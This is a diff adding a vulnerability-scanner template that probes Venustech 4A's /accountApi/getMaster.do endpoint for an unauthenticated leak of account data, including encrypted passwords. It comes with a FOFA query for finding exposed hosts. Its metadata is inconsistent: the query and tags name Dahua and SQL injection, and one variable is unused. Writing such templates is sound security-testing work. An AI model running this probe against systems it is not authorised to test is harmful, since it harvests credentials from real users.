@@ -1,0 +1,31 @@
+id: venustech-4a-getMaster-disclosure
+
+info:
+  name: Venustech 4A - Disclosure
+  author: Co5mos
+  severity: critical
+  metadata:
+    max-request: 1
+    fofa-query: app="dahua-智慧园区综合管理平台"
+  tags: dahua,sqli
+
+variables:
+  num: "999999999"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/accountApi/getMaster.do"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'authtype'
+          - 'cryptPwd'
+          - 'email'
+
+      - type: status
+        status:
+          - 200
